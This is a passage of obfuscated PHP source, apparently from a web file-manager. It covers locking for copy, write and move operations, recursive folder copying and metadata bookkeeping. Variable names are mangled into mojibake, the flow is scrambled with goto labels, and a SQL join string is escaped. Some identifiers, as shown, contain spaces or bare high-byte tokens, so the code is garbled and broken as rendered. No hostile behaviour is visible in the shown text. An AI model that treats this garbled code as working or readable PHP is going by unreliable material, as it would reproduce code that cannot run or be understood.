Ò¡×Û[381]]) { $FÌ˜«Æ¿Éø .= $AŒ Ò¡×Û[18]; } goto Fõš¶Úô’; EŸšõ»Äë: } return $bçŒæ«…«Â; goto DĞ‰Š„±„ô; b±×Ù¾ìš: $this->_listAppendAuth($F–Ûõï¤Êé); $this->_listAppendUser($F–Ûõï¤Êé); $this->_listAppendPath($F–Ûõï¤Êé); goto d»ò­Ù—¢»; A˜­ğÊ‰”î: $AÁŞ‚µ„¾À = $AŒ Ò¡×Û[499]; $Eê˜¡ËæÈ = "\114\105\x46\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\137\146\151\154\145\40\x66\151\x6c\145\40\157\156\x20\163\x6f\x75\x72\x63\145\x2e\146\151\154\x65\x49\x44\x20\75\x20\x66\x69\x6c\x65\x2e\x66\x69\x6c\x65\x49\104"; $F–Ûõï¤Êé = $this->alias($AŒ Ò¡×Û[500])->field($AÁŞ‚µ„¾À)->where($aÉÎ±ËêÚÄ)->join($Eê˜¡ËæÈ)->select(); goto b±×Ù¾ìš; DĞ‰Š„±„ô: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($fãò£’Ü±Ê) { goto Ašˆ‡¶‹Œ¨; Ašˆ‡¶‹Œ¨: $dŞî¼Â‡» =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->allowLock()) { return; } $this->_lockCheck($dŞî¼Â‡»[503], $fãò£’Ü±Ê); goto A¼ó½¾°‰÷; Bˆ¡Ù®Ã™«: $this->_lockEvent($fãò£’Ü±Ê, array($dŞî¼Â‡»[506], $dŞî¼Â‡»[507]), $b‰¶éÁßÀ); $this->_lockCheckEnd($dŞî¼Â‡»[503], $fãò£’Ü±Ê); goto CĞñŞ”âùô; A¼ó½¾°‰÷: $b‰¶éÁßÀ = 1; $this->_lockEvent($fãò£’Ü±Ê, array($dŞî¼Â‡»[504], $dŞî¼Â‡»[505]), $b‰¶éÁßÀ); $this->_lockParent($fãò£’Ü±Ê, array($dŞî¼Â‡»[505]), $b‰¶éÁßÀ); goto Bˆ¡Ù®Ã™«; CĞñŞ”âùô: } public function lockCopyEnd($F’á¼ˆ­Ñ¨) { $c½­®ç²­¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->allowLock()) { return; } $Cİóºçğ = 0; $this->_lockEvent($F’á¼ˆ­Ñ¨, array($c½­®ç²­¸[504], $c½­®ç²­¸[505]), $Cİóºçğ); $this->_lockParent($F’á¼ˆ­Ñ¨, array($c½­®ç²­¸[505]), $Cİóºçğ); $this->_lockEvent($F’á¼ˆ­Ñ¨, array($c½­®ç²­¸[506], $c½­®ç²­¸[507]), $Cİóºçğ); } public function lockWriteStart($aĞå—…Ù ï, $a°¢‡ÑË‹î = '') { goto eëÄò¤…ê; c›²›ÊŒ‰®: $this->_lockParent($aĞå—…Ù ï, array($c¹¬¼÷¥‡[503], $c¹¬¼÷¥‡[505]), $AÌ¦òƒ÷Ó); $this->_lockCheckEnd($c¹¬¼÷¥‡[504], $aĞå—…Ù ï); goto Fİ†²Ü«ï; eëÄò¤…ê: $c¹¬¼÷¥‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->allowLock()) { return; } $this->_lockCheck($c¹¬¼÷¥‡[504], $aĞå—…Ù ï); goto BìŠóï’‰; BìŠóï’‰: $AÌ¦òƒ÷Ó = 1; $this->_lockKey($c¹¬¼÷¥‡[508] . $aĞå—…Ù ï . $c¹¬¼÷¥‡[103] . $a°¢‡ÑË‹î, $AÌ¦òƒ÷Ó); $this->_lockEvent($aĞå—…Ù ï, array($c¹¬¼÷¥‡[503], $c¹¬¼÷¥‡[505]), $AÌ¦òƒ÷Ó); goto c›²›ÊŒ‰®; Fİ†²Ü«ï: } public function lockWriteEnd($cƒ×’÷…ò¨, $b¶åõŠ¼ï = '') { $E±æ×ºçËİ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->allowLock()) { return; } $cˆñë–‹ÕÒ = 0; $this->_lockKey($E±æ×ºçËİ[508] . $cƒ×’÷…ò¨ . $E±æ×ºçËİ[103] . $b¶åõŠ¼ï, $cˆñë–‹ÕÒ); $this->_lockEvent($cƒ×’÷…ò¨, array($E±æ×ºçËİ[503], $E±æ×ºçËİ[505]), $cˆñë–‹ÕÒ); $this->_lockParent($cƒ×’÷…ò¨, array($E±æ×ºçËİ[503], $E±æ×ºçËİ[505]), $cˆñë–‹ÕÒ); } public function lockMoveStart($A¥Á÷â§æ›) { goto eƒåœ¯Áö; eƒåœ¯Áö: $cÙçİèßÔÚ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->allowLock()) { return; } $this->_lockCheck($cÙçİèßÔÚ[505], $A¥Á÷â§æ›); goto C…¦§”ÂÜ³; cÍÆÈ®ƒ•¢: $this->_lockParent($A¥Á÷â§æ›, array($cÙçİèßÔÚ[503], $cÙçİèßÔÚ[505]), $eª»Ñ•Å“Œ); $this->_lockEvent($A¥Á÷â§æ›, array($cÙçİèßÔÚ[510], $cÙçİèßÔÚ[506], $cÙçİèßÔÚ[507]), $eª»Ñ•Å“Œ); $this->_lockCheckEnd($cÙçİèßÔÚ[505], $A¥Á÷â§æ›); goto fšáÛ¶˜á‹; C…¦§”ÂÜ³: $eª»Ñ•Å“Œ = 1; $this->_lockKey($cÙçİèßÔÚ[509] . $A¥Á÷â§æ›, $eª»Ñ•Å“Œ); $this->_lockEvent($A¥Á÷â§æ›, array($cÙçİèßÔÚ[503], $cÙçİèßÔÚ[504]), $eª»Ñ•Å“Œ); goto cÍÆÈ®ƒ•¢; fšáÛ¶˜á‹: } public function lockMoveEnd($a×òØÍô„®) { goto bë°ÏËŒ¨; bë°ÏËŒ¨: $C™ÑË§êÀ¾ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->allowLock()) { return; } $Aµ„ŒÅÙ² = 0; goto CÁ™‘„†ô; CÁ™‘„†ô: $this->_lockKey($C™ÑË§êÀ¾[509] . $a×òØÍô„®, $Aµ„ŒÅÙ²); $this->_lockEvent($a×òØÍô„®, array($C™ÑË§êÀ¾[503], $C™ÑË§êÀ¾[504]), $Aµ„ŒÅÙ²); $this->_lockParent($a×òØÍô„®, array($C™ÑË§êÀ¾[503], $C™ÑË§êÀ¾[505]), $Aµ„ŒÅÙ²); goto EÑä±õ…°‚; EÑä±õ…°‚: $this->_lockEvent($a×òØÍô„®, array($C™ÑË§êÀ¾[510], $C™ÑË§êÀ¾[506], $C™ÑË§êÀ¾[507]), $Aµ„ŒÅÙ²); goto C¦Ä¨æÎğé; C¦Ä¨æÎğé: } private function _lockCheck($FôìÓ×ó‚©, $Eª„‹‹Öâ÷) { goto Døæö’Â˜; Døæö’Â˜: $d´ªîòõÒ¸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fòöÌî‘’Æ = $this->sourceInfo($Eª„‹‹Öâ÷); $d‡ÂœèˆƒÔ = $FôìÓ×ó‚© . $d´ªîòõÒ¸[103] . $Eª„‹‹Öâ÷; goto a¿ÚŞ„øòˆ; c‚ë¶Ôå‰„: $BÂ¼Å¶Ç› = array_reverse($this->parentLevelArray($fòöÌî‘’Æ[$d´ªîòõÒ¸[472]])); foreach ($BÂ¼Å¶Ç› as $aãÒ·¬†ï) { $d‡ÂœèˆƒÔ = $FôìÓ×ó‚© . $d´ªîòõÒ¸[512] . $aãÒ·¬†ï; if (CacheLock::lockGet($d´ªîòõÒ¸[513] . $d‡ÂœèˆƒÔ)) { $fòöÌî‘’Æ = $this->sourceInfo($aãÒ·¬†ï); CacheLock::setErrorMsg($d´ªîòõÒ¸[169] . htmlspecialchars($fòöÌî‘’Æ[$d´ªîòõÒ¸[38]]) . $d´ªîòõÒ¸[489] . $d× ¨â‰Éé); $this->_lockKey($d‡ÂœèˆƒÔ, 1); $this->_lockKey($d‡ÂœèˆƒÔ, 0); } } goto cÀ´Åæ®¶Û; FÜãêï˜õ: CacheLock::setErrorMsg($d´ªîòõÒ¸[169] . htmlspecialchars($fòöÌî‘’Æ[$d´ªîòõÒ¸[38]]) . $d´ªîòõÒ¸[489] . $d× ¨â‰Éé); $this->_lockKey($d‡ÂœèˆƒÔ, 1); $this->_lockKey($d‡ÂœèˆƒÔ, 0); goto c‚ë¶Ôå‰„; a¿ÚŞ„øòˆ: $this->_lockTimeStart[$d‡ÂœèˆƒÔ] = timeFloat(); if (!is_array($fòöÌî‘’Æ)) { return; } $d× ¨â‰Éé = LNG($d´ªîòõÒ¸[511]); goto FÜãêï˜õ; cÀ´Åæ®¶Û: } private function _lockCheckEnd($cà»À£Íò©, $EİÊ…‹«) { goto Fß†İ¶ˆË«; dÑåò†çÈ­: if ($aÉµ×ç”É > 0.5) { unset(self::$cacheSourceInfo[$fŒÆ¯œµŠå[421] . $EİÊ…‹«]); } $CÕâ†©¦ = $this->sourceInfo($EİÊ…‹«); if (!$CÕâ†©¦) { show_json(LNG($fŒÆ¯œµŠå[113]), !1); } goto FêÓˆÓ‚º; Fß†İ¶ˆË«: $fŒÆ¯œµŠå =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÙÜç‹¨ = $cà»À£Íò© . $fŒÆ¯œµŠå[103] . $EİÊ…‹«; CacheLock::setErrorMsg($fŒÆ¯œµŠå[372]); goto e”¾œß¨Û›; e”¾œß¨Û›: if (!isset($this->_lockTimeStart[$fÙÜç‹¨])) { return; } $aÉµ×ç”É = timeFloat() - $this->_lockTimeStart[$fÙÜç‹¨]; unset($this->_lockTimeStart[$fÙÜç‹¨]); goto dÑåò†çÈ­; FêÓˆÓ‚º: } private function _lockParent($Fš‰Â…Ûà†, $fÔáŠò¼, $Cø»’ÈŒ°ô) { if (!$this->autoLockSet) { return; } $C¡é„ÖŠá„ = $this->sourceInfo($Fš‰Â…Ûà†); if (!is_array($C¡é„ÖŠá„)) { return; } $Eéí†‘Í«æ = array_reverse($this->parentLevelArray($C¡é„ÖŠá„[$_SERVER[¹÷ˆ§éÒ°ú][472]])); foreach ($Eéí†‘Í«æ as $fÓ´·óñæÕ) { $this->_lockEvent($fÓ´·óñæÕ, $fÔáŠò¼, $Cø»’ÈŒ°ô); } } private function _lockEvent($Fµˆ®ÇğñÆ, $F¸á»ò‘‰, $bŒ•Áˆ„õø) { $c›ƒóÜÇ‚· =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->autoLockSet) { return; } foreach ($F¸á»ò‘‰ as $Aï´†ß—ª¿) { $D¥‘ô‘ŒÉ£ = $Aï´†ß—ª¿ . $c›ƒóÜÇ‚·[103] . $Fµˆ®ÇğñÆ; if ($bŒ•Áˆ„õø && CacheLock::lockGet($c›ƒóÜÇ‚·[513] . $D¥‘ô‘ŒÉ£)) { continue; } $this->_lockKey($D¥‘ô‘ŒÉ£, $bŒ•Áˆ„õø); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($dÏ¡ƒó™, $añÚš—–¾ = 1) { $c†ŒĞ¢ÇÒä = $_SERVER[¹÷ˆ§éÒ°ú][513] . md5($dÏ¡ƒó™); if ($añÚš—–¾) { if (isset(self::$_lockItemArr[$c†ŒĞ¢ÇÒä])) { return; } self::$_lockItemArr[$c†ŒĞ¢ÇÒä] = 1; CacheLock::lock($c†ŒĞ¢ÇÒä, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$c†ŒĞ¢ÇÒä])) { return; } unset(self::$_lockItemArr[$c†ŒĞ¢ÇÒä]); CacheLock::unlock($c†ŒĞ¢ÇÒä); } } public function isParentOf($c £æŠñåá, $Aá‹áİğ¹) { goto AÁïö¡‡¼´; F¢İ¾Ÿçí†: $E‚­öíÁÀ = $f¡ÓŞ¡µ•È[$AÛö‚ ¡[472]] . $f¡ÓŞ¡µ•È[$AÛö‚ ¡[380]] . $AÛö‚ ¡[57]; $C·§Òïƒ¤ƒ = $A¸ğ­œºÔ[$AÛö‚ ¡[472]] . $A¸ğ­œºÔ[$AÛö‚ ¡[380]] . $AÛö‚ ¡[57]; $B®ØÃù‘õÃ = strpos($C·§Òïƒ¤ƒ, $E‚­öíÁÀ) === 0; goto AƒÂÜ—ÓÃ¯; AÁïö¡‡¼´: $AÛö‚ ¡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $f¡ÓŞ¡µ•È = $this->sourceInfo($c £æŠñåá); $A¸ğ­œºÔ = $this->sourceInfo($Aá‹áİğ¹); goto F¢İ¾Ÿçí†; AƒÂÜ—ÓÃ¯: return $B®ØÃù‘õÃ; goto A—æåƒÒ; A—æåƒÒ: } private $targetIsDelete = 0; public function copy($BÆ¥ó„, $BßÁÕê»Ú, $e…­·ß“ïŞ = REPEAT_REPLACE, $b„ˆ³¸ç†â = '') { goto bƒ¸İÑİŒ; d­ˆ—ˆ¢ôÂ: $this->saveAll($a§‹ùñÄÛØ[$FÛ—¼‹Œ«Ç[516]]); Model($FÛ—¼‹Œ«Ç[179])->linkAdd($a§‹ùñÄÛØ[$FÛ—¼‹Œ«Ç[514]]); $this->folderSizeReset($BßÁÕê»Ú); goto DÓ¤Ï‘ÆÒ˜; bƒ¸İÑİŒ: $FÛ—¼‹Œ«Ç =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÌ¸­…Öéî = $this->sourceInfo($BÆ¥ó„); $AÏ¹­¤¸›– = $this->sourceInfo($BßÁÕê»Ú); goto dÇä©â‘êí; DÓ¤Ï‘ÆÒ˜: $this->updateModifyTime($BßÁÕê»Ú); return $c¨×¢»¶é; goto Dî‰Ô§ÀÍø; aŸÙª•¥Ä: $this->targetIsDelete = intval($DÌ¸­…Öéî[$FÛ—¼‹Œ«Ç[408]]); $F‚ÅŸÙŒ = $this->fileNameExistCache($BßÁÕê»Ú, $DÌ¸­…Öéî[$FÛ—¼‹Œ«Ç[38]]); $c¨×¢»¶é = $this->_copy($BÆ¥ó„, $BßÁÕê»Ú, $e…­·ß“ïŞ, $a§‹ùñÄÛØ, !0, $b„ˆ³¸ç†â); goto bºëÑŠ¸Ü; eœ…Èùì¹¯: $this->lockCopyStart($BÆ¥ó„); $this->lockWriteStart($BßÁÕê»Ú, $AÆÅÆ±øÒ­); $a§‹ùñÄÛØ = array($FÛ—¼‹Œ«Ç[514] => array(), $FÛ—¼‹Œ«Ç[515] => array(), $FÛ—¼‹Œ«Ç[516] => array()); goto aŸÙª•¥Ä; dÇä©â‘êí: if (!$DÌ¸­…Öéî || !$AÏ¹­¤¸›– || $AÏ¹­¤¸›–[$FÛ—¼‹Œ«Ç[381]] != $FÛ—¼‹Œ«Ç[95]) { return !1; } if ($this->isParentOf($BÆ¥ó„, $BßÁÕê»Ú)) { return !1; } $AÆÅÆ±øÒ­ = $b„ˆ³¸ç†â ? $b„ˆ³¸ç†â : $DÌ¸­…Öéî[$FÛ—¼‹Œ«Ç[38]]; goto eœ…Èùì¹¯; cËî¤£»êŠ: if ($DÌ¸­…Öéî[$FÛ—¼‹Œ«Ç[381]] == $FÛ—¼‹Œ«Ç[95] && $F‚ÅŸÙŒ == $c¨×¢»¶é) { $this->folderSizeResetChildren($F‚ÅŸÙŒ); } Model($FÛ—¼‹Œ«Ç[517])->addAll($a§‹ùñÄÛØ[$FÛ—¼‹Œ«Ç[515]], array(), !0); if ($F‚ÅŸÙŒ != $c¨×¢»¶é || $DÌ¸­…Öéî[$FÛ—¼‹Œ«Ç[381]] == $FÛ—¼‹Œ«Ç[95]) { Model($FÛ—¼‹Œ«Ç[518])->eventCopy($c¨×¢»¶é); } goto d­ˆ—ˆ¢ôÂ; bºëÑŠ¸Ü: $this->_childrenListClear(); $this->lockCopyEnd($BÆ¥ó„); $this->lockWriteEnd($BßÁÕê»Ú, $AÆÅÆ±øÒ­); goto cËî¤£»êŠ; Dî‰Ô§ÀÍø: } private function _copy($DŠìãºÀ, $fì™¤×˜ÊÌ, $DöÎÚµ‹¬‘, &$D¡¢¸‹¡¸, $C‹…½ßã†ß, $F¹Ä£óí”‡ = '') { goto fáìˆ˜…Î¶; A½•”õªÃ: if (!$aÚäÅ—Áñ) { return $this->_copyCreate($DŠìãºÀ, $fì™¤×˜ÊÌ, $cùõÄšÍÔ, $D¡¢¸‹¡¸); } $dÕ¹Á÷Âáã = $aÚäÅ—Áñ; if ($Dƒç°‚àÜ”) { if ($DöÎÚµ‹¬‘ == REPEAT_RENAME_FOLDER) { $cùõÄšÍÔ = $this->fileNameAutoCache($fì™¤×˜ÊÌ, $cùõÄšÍÔ, $DöÎÚµ‹¬‘, $Dƒç°‚àÜ”); $dÕ¹Á÷Âáã = $this->_copyCreate($DŠìãºÀ, $fì™¤×˜ÊÌ, $cùõÄšÍÔ, $D¡¢¸‹¡¸); } else { $EµíÆß«Ñ‡ = $this->_childrenList($DŠìãºÀ); foreach ($EµíÆß«Ñ‡ as $EÛ„‹İµïğ) { $this->_copy($EÛ„‹İµïğ[$dÁº”¨àä¶[380]], $aÚäÅ—Áñ, $DöÎÚµ‹¬‘, $D¡¢¸‹¡¸, !1); } } } else { if ($DöÎÚµ‹¬‘ == REPEAT_RENAME || $DöÎÚµ‹¬‘ == REPEAT_RENAME_FOLDER) { $cùõÄšÍÔ = $this->fileNameAutoCache($fì™¤×˜ÊÌ, $cùõÄšÍÔ, $DöÎÚµ‹¬‘, $Dƒç°‚àÜ”); $dÕ¹Á÷Âáã = $this->_copyCreate($DŠìãºÀ, $fì™¤×˜ÊÌ, $cùõÄšÍÔ, $D¡¢¸‹¡¸); } else { if ($DöÎÚµ‹¬‘ == REPEAT_REPLACE) { $fò™øÆ¸Š = $this->sourceInfoCache($aÚäÅ—Áñ); $dœŒÜ§‚¾ = $this->fileHistory($fò™øÆ¸Š, $FÎé¬ÙËºò[$dÁº”¨àä¶[430]], $FÎé¬ÙËºò[$dÁº”¨àä¶[89]]); if ($dœŒÜ§‚¾) { $D¡¢¸‹¡¸[$dÁº”¨àä¶[514]][] = $FÎé¬ÙËºò[$dÁº”¨àä¶[430]]; } } else { if ($DöÎÚµ‹¬‘ == REPEAT_SKIP) { } } } Hook::trigger($dÁº”¨àä¶[519], array($dÁº”¨àä¶[520], $FÎé¬ÙËºò, 0)); } goto CÑ•†ÑÇğ»; F™ØÌÜ¹¶¿: $cùõÄšÍÔ = $F¹Ä£óí”‡ ? $F¹Ä£óí”‡ : $FÎé¬ÙËºò[$dÁº”¨àä¶[38]]; $aÚäÅ—Áñ = $this->fileNameExistCache($fì™¤×˜ÊÌ, $cùõÄšÍÔ); if ($C‹…½ßã†ß) { $this->_childrenAllMake($DŠìãºÀ); if ($Dƒç°‚àÜ” && $aÚäÅ—Áñ) { $this->_childrenAllMake($aÚäÅ—Áñ); } } goto A½•”õªÃ; CÑ•†ÑÇğ»: return $dÕ¹Á÷Âáã; goto c¿¿³ö ’; fáìˆ˜…Î¶: $dÁº”¨àä¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $FÎé¬ÙËºò = $this->sourceInfoCache($DŠìãºÀ); $Dƒç°‚àÜ” = $FÎé¬ÙËºò[$dÁº”¨àä¶[381]] == $dÁº”¨àä¶[95]; goto F™ØÌÜ¹¶¿; c¿¿³ö ’: } private function _copyCreate($A‘’„¸°É», $B§æÏÍÊ­, $c®Şö¯Õî‘, &$f¹·Ã­®ª’) { goto D“ÌãÎ°†Ô; B†òŒëŒÆ‡: if ($E—•£ª§¿[$aÆ“„½œ«[381]] != $aÆ“„½œ«[95]) { $f¹·Ã­®ª’[$aÆ“„½œ«[514]][] = $E—•£ª§¿[$aÆ“„½œ«[430]]; return $d±Ÿ’‡±¹×; } $fÌŸÙÜ‡² = array(); $D±‘œñƒŠ™ = array(); goto C­åï¼³Ú; C­åï¼³Ú: $this->_childrenListAll($A‘’„¸°É», $fÌŸÙÜ‡²); $b¿£òÉ³Ã = count($fÌŸÙÜ‡²); if ($b¿£òÉ³Ã == 0) { return $d±Ÿ’‡±¹×; } goto aĞŞƒšŸè; bÇãˆÓä®æ: $this->addAll($D±‘œñƒŠ™, array(), !1); $AÀäç»Îª = $this->where(array($aÆ“„½œ«[474] => $d±Ÿ’‡±¹×))->select(); $Eâäê±™› = $this->_childrenMakeRelation($fÌŸÙÜ‡², $AÀäç»Îª); goto B¶İ¡È“‰; d‰µ¥ŸäÎæ: foreach ($AÀäç»Îª as $Déª÷ƒÏËÂ) { $b¢ÆÃ¼ä—³ = $Déª÷ƒÏËÂ[$aÆ“„½œ«[380]]; $A¾–ÇËßË = $this->_childrenMatch($Eâäê±™›, $Déª÷ƒÏËÂ, $BàÌ»ëÅ­); $fîÔÖù²Ç„[] = array($aÆ“„½œ«[380], $b¢ÆÃ¼ä—³, $aÆ“„½œ«[474], $A¾–ÇËßË[$aÆ“„½œ«[474]]); $F²ÚŠîË«ù[] = array($aÆ“„½œ«[380], $b¢ÆÃ¼ä—³, $aÆ“„½œ«[472], $A¾–ÇËßË[$aÆ“„½œ«[472]]); $this->_copyApplyMeta($Déª÷ƒÏËÂ, $f¹·Ã­®ª’); if ($Déª÷ƒÏËÂ[$aÆ“„½œ«[381]] != $aÆ“„½œ«[95]) { $f¹·Ã­®ª’[$aÆ“„½œ«[514]][] = $Déª÷ƒÏËÂ[$aÆ“„½œ«[430]]; } } $this->chunkEventSet($aÆ“„½œ«[526], array($aÆ“„½œ«[527], $F„¬©¦ãŠ«, $b¿£òÉ³Ã)); $this->saveAll($fîÔÖù²Ç„); goto b®µƒÍŠ …; b®µƒÍŠ …: $this->chunkEventSet($aÆ“„½œ«[528], array($aÆ“„½œ«[529], $F„¬©¦ãŠ«, $b¿£òÉ³Ã)); $this->saveAll($F²ÚŠîË«ù); return $d±Ÿ’‡±¹×; goto b¦Ğöªªì; D“ÌãÎ°†Ô: $aÆ“„½œ« =& $_SERVER[¹÷ˆ§éÒ°ú]; $E—•£ª§¿ = $this->sourceInfoCache($A‘’„¸°É»); $cÛ¿§×â°÷ = $this->sourceInfoCache($B§æÏÍÊ­); goto bÙ¬²âèçª; B¶İ¡È“‰: $Eâäê±™›[$A‘’„¸°É»] = $d±Ÿ’‡±¹×; $fîÔÖù²Ç„ = array(); $F²ÚŠîË«ù = array(); goto d‰µ¥ŸäÎæ; aĞŞƒšŸè: $BàÌ»ëÅ­ = $this->sourceInfo($d±Ÿ’‡±¹×); foreach ($fÌŸÙÜ‡² as $Déª÷ƒÏËÂ) { $F°”»©ãã¹ = $this->_makeItemData($Déª÷ƒÏËÂ, $BàÌ»ëÅ­, $Déª÷ƒÏËÂ[$aÆ“„½œ«[38]]); $F°”»©ãã¹[$aÆ“„½œ«[472]] = $Déª÷ƒÏËÂ[$aÆ“„½œ«[472]]; $D±‘œñƒŠ™[] = $F°”»©ãã¹; } $this->chunkEventSet($aÆ“„½œ«[524], array($aÆ“„½œ«[525], $F„¬©¦ãŠ«, $b¿£òÉ³Ã)); goto bÇãˆÓä®æ; bÙ¬²âèçª: $F„¬©¦ãŠ« = $this->_makeItemData($E—•£ª§¿, $cÛ¿§×â°÷, $c®Şö¯Õî‘); Hook::trigger($aÆ“„½œ«[521], $F„¬©¦ãŠ«); Hook::trigger($aÆ“„½œ«[522], array($aÆ“„½œ«[523], $F„¬©¦ãŠ«, 0)); goto e¥˜‘ßå˜‹; e¥˜‘ßå˜‹: $d±Ÿ’‡±¹× = $this->add($F„¬©¦ãŠ«); $f¯‡¥«Ç¸ = array($aÆ“„½œ«[380] => $d±Ÿ’‡±¹×, $aÆ“„½œ«[38] => $c®Şö¯Õî‘); $this->_copyApplyMeta($f¯‡¥«Ç¸, $f¹·Ã­®ª’); goto B†òŒëŒÆ‡; b¦Ğöªªì: } private function _childrenMakeRelation($fĞô¶ƒ­Ò, $A• ¸Ş×Ê) { $eÓğÄ¶àÄÆ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C Ôñ±¦¯î = array(); $fÇ«½ÅÙ = array(); foreach ($fĞô¶ƒ­Ò as $föˆÓ–ãê) { $eœ…ìíğó° = $föˆÓ–ãê[$eÓğÄ¶àÄÆ[38]] . $eÓğÄ¶àÄÆ[18] . $föˆÓ–ãê[$eÓğÄ¶àÄÆ[472]]; $C Ôñ±¦¯î[$eœ…ìíğó°] = $föˆÓ–ãê[$eÓğÄ¶àÄÆ[380]]; } foreach ($A• ¸Ş×Ê as $föˆÓ–ãê) { $eœ…ìíğó° = $föˆÓ–ãê[$eÓğÄ¶àÄÆ[38]] . $eÓğÄ¶àÄÆ[18] . $föˆÓ–ãê[$eÓğÄ¶àÄÆ[472]]; $CèƒŸÓÓßÑ = $C Ôñ±¦¯î[$eœ…ìíğó°]; $fÇ«½ÅÙ[$CèƒŸÓÓßÑ] = $föˆÓ–ãê[$eÓğÄ¶àÄÆ[380]]; } return $fÇ«½ÅÙ; } private function _childrenMatch($B‚’œ÷î‰, $bøÜØÇôİÍ, $E ­›Ş¸«—) { goto A²ÉâàÇ; eğ·«ÈŞĞ: foreach ($cÉƒ‘›ñÙŞ as $a¬ˆŠ†‰ì¨) { if (isset($B‚’œ÷î‰[$a¬ˆŠ†‰ì¨])) { $E­ÉšöëğÁ .= $B‚’œ÷î‰[$a¬ˆŠ†‰ì¨] . $D¾¯ãµ„¤[530]; } } $E­ÉšöëğÁ = rtrim($E­ÉšöëğÁ, $D¾¯ãµ„¤[57]) . $D¾¯ãµ„¤[57]; $d¢ø¦¥º‡ = $this->parentLevelArray($E­ÉšöëğÁ); goto E—œÏŠô; E—œÏŠô: $c¤Éìç™¹Š = $d¢ø¦¥º‡[count($d¢ø¦¥º‡) - 1]; return array($D¾¯ãµ„¤[474] => $c¤Éìç™¹Š, $D¾¯ãµ„¤[472] => $E­ÉšöëğÁ); goto f·Çê˜ôˆ™; A²ÉâàÇ: $D¾¯ãµ„¤ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E­ÉšöëğÁ = $E ­›Ş¸«—[$D¾¯ãµ„¤[472]]; $cÉƒ‘›ñÙŞ = $this->parentLevelArray($bøÜØÇôİÍ[$D¾¯ãµ„¤[472]]); goto eğ·«ÈŞĞ; f·Çê˜ôˆ™: } private function _makeItemData($C½À›–æ‹Ô, $fß×„‚×±÷, $C‰Üõ‡£ÏÅ) { $EßÅ‹Ò‘±½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aƒ—Ë‘Ó‡ó = array($EßÅ‹Ò‘±½[531] => $C½À›–æ‹Ô[$EßÅ‹Ò‘±½[381]], $EßÅ‹Ò‘±½[397] => $C‰Üõ‡£ÏÅ, $EßÅ‹Ò‘±½[532] => $C½À›–æ‹Ô[$EßÅ‹Ò‘±½[383]], $EßÅ‹Ò‘±½[431] => $C½À›–æ‹Ô[$EßÅ‹Ò‘±½[430]], $EßÅ‹Ò‘±½[533] => $C½À›–æ‹Ô[$EßÅ‹Ò‘±½[89]], $EßÅ‹Ò‘±½[534] => $fß×„‚×±÷[$EßÅ‹Ò‘±½[382]], $EßÅ‹Ò‘±½[535] => $fß×„‚×±÷[$EßÅ‹Ò‘±½[469]], $EßÅ‹Ò‘±½[536] => USER_ID, $EßÅ‹Ò‘±½[537] => USER_ID, $EßÅ‹Ò‘±½[379] => $fß×„‚×±÷[$EßÅ‹Ò‘±½[380]], $EßÅ‹Ò‘±½[538] => $fß×„‚×±÷[$EßÅ‹Ò‘±½[472]] . $fß×„‚×±÷[$EßÅ‹Ò‘±½[380]] . $EßÅ‹Ò‘±½[57], $EßÅ‹Ò‘±½[407] => 0, $EßÅ‹Ò‘±½[539] => $EßÅ‹Ò‘±½[43]); return $aƒ—Ë‘Ó‡ó; } private function _copyApplyMeta($B²²çª…Ö, &$cÄÀµ™ÑØ) { $d²†âß›£š =& $_SERVER[¹÷ˆ§éÒ°ú]; $c ‚†³ƒß„ = $B²²çª…Ö[$d²†âß›£š[380]]; $BîˆŸÓ‡ä¸ = $B²²çª…Ö[$d²†âß›£š[38]]; if (!isset($B²²çª…Ö[$d²†âß›£š[540]]) || !$B²²çª…Ö[$d²†âß›£š[540]] || $B²²çª…Ö[$d²†âß›£š[540]] == $d²†âß›£š[481]) { $cÄÀµ™ÑØ[$d²†âß›£š[516]][] = array($d²†âß›£š[380], $c ‚†³ƒß„, $d²†âß›£š[540], short_id($c ‚†³ƒß„)); } if (Input::check($BîˆŸÓ‡ä¸, $d²†âß›£š[541])) { $cÄÀµ™ÑØ[$d²†âß›£š[515]][] = array($d²†âß›£š[380] => $c ‚†³ƒß„, $d²†âß›£š[101] => $d²†âß›£š[427], $d²†âß›£š[370] => str_replace($d²†âß›£š[60], $d²†âß›£š[43], Pinyin::encode($BîˆŸÓ‡ä¸))); $cÄÀµ™ÑØ[$d²†âß›£š[515]][] = array($d²†âß›£š[380] => $c ‚†³ƒß„, $d²†âß›£š[101] => $d²†âß›£š[426], $d²†âß›£š[370] => Pinyin::encode($BîˆŸÓ‡ä¸, $d²†âß›£š[542])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($EîÔÆœ‚öå) { goto EçËå„´³; FÉò÷ÄŒÖ: $FÌï’Şñ = array_to_keyvalue($FÌï’Şñ, $bÈÇåš¿¶[380]); foreach ($FÌï’Şñ as $Fœ†¼œÓÕƒ) { $bŠ¥³ˆÁ = $Fœ†¼œÓÕƒ[$bÈÇåš¿¶[474]]; $EîÔÆœ‚öå = $Fœ†¼œÓÕƒ[$bÈÇåš¿¶[380]]; if (!isset($this->_childrenListCache[$EîÔÆœ‚öå]) && $Fœ†¼œÓÕƒ[$bÈÇåš¿¶[381]] == $bÈÇåš¿¶[95]) { $this->_childrenListCache[$EîÔÆœ‚öå] = array(); } if (!isset($this->_childrenListCache[$bŠ¥³ˆÁ])) { $this->_childrenListCache[$bŠ¥³ˆÁ] = array(); } 